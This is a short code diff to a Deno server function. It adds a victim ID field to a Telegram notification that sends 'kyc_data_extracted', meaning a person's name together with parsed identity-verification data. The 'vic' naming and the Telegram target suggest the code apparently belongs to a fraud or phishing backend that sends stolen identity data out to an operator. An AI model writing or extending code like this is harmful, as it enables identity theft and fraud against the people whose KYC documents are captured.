@@ -200,6 +200,7 @@ Deno.serve(async (req) => {
       `${prof?.first_name ?? ""} ${prof?.last_name ?? ""}`.trim() || prof?.email || "Unbekannt";
 
     const result = await sendTelegramNotification(service, "kyc_data_extracted", {
+      vic_id: userId,
       vic_name: vicName,
       ...parsed,
     });
